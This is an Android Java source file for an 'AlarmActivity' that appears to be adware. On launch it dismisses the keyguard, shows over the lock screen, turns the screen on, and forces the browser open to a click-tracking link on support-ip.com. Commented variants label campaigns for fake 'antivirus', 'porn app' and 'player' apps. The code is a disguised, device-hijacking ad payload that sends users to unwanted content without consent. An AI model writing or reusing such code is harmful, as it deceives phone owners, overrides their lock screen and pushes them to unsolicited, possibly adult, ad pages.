package com.example.asti.myapplication;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.StringBuilderPrinter;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class AlarmActivity extends Activity{


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        // антивирус
//        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=anund");

        // порноапп
        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=adund");

        // плеер
//        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=plund");

        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(intent);
    }


}